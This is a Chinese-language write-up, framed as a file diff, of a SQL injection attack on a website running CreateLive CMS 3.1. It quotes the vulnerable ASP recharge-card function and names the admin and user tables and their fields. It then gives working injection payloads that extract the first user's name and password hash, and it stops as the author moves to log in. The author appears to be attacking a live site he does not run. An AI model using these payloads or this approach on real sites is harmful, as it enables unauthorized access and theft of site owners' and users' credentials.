@@ -1,0 +1,49 @@
+CreateLive CMS 3.1注入漏洞
+
+无意间看到黑手12月份的书刊，看到了CreateLive CMS 4.2的注入漏洞，作者是朝阳。正好手里有个也是CreateLive CMS系统的，但是版本是3.1的，我想应该也存在这个洞吧！
+     网站是开放注册的。开始吧！
+ 
+  存在注入的文件是user/User_UserCz.asp,在定义的chkCzNum函数中，CzNum和CzUser、Pass没有过滤就被带入查询语句中，形成注入漏洞。该漏洞不能使用注入工具猜解，主要的原因是有验证码和使用POST提交，相关代码如下:
+ 
+<--more-->
+ 
+  Sub chkCzNum()
+ Dim CzUser,Self,CzNum,Pass
+ Dim sPoint,sPointAll,sDayNum,sDayNumAll
+ Dim rsUser,ChargeType
+ CzUser = Trim(request("CzUser"))
+ Self = Trim(request("Self"))
+ CzNum = Trim(request("CzNum"))
+ Pass = Trim(request("Pass"))
+ if CzNum="" or Pass="" then
+  Call Cl.OutMsg("充值卡号或充值密码不能为空！","User_UserCz.asp")
+ end if
+ if Not Cl.CodeIsTrue(Trim(request("ChkPlusCz")),"ChkPlusCz") then
+  Call Cl.OutMsg("验证码不正确","User_UserCz.asp")
+ end if
+ dim rsCz
+ set rsCz=Server.CreateObject("Adodb.RecordSet")
+ OpenConn : rsCz.open "Select * from Cl_UserCz where CzNum="&CzNum&" and Pass="&Pass&"",Conn,1,3
+ if rsCz.bof and rsCz.eof then
+  rsCz.close:set rsCz=Nothing
+  Call Cl.OutMsg("不存在此充值卡或密码错误，请重新输入！","User_UserCz.asp")
+ End if
+ sPoint =rsCz("Point")
+ sDayNum =rsCz("DayNum")
+ if rsCz("IsUser")<>0 then
+  rsCz.close:set rsCz=Nothing
+  Call Cl.OutMsg("该充值卡已被使用！","User_UserCz.asp")
+ end if
+ 
+  在“充值卡充值”点击进入，在“充值卡号”填入注入语句就可以啦，然后点击“充值”按钮，
+
+
+返回错误，可以确定数据库的类型是mssql。
+ 
+  主要是cl_admin，cl_user保存用户数据,cl_admin是管理员的表，它的字段有username,password。cl_user是用户表,它的字段和管理员的表一样。
+ 
+  3 and 1=(select username from cl_user where userid=1);--    爆出第一个用户的名字是Admin
+
+3 and 1=(select userpassword from cl_user where userid=1);--   爆出了Admin用户密码为md5
+
+根据爆出的用户名和密码进行登录，
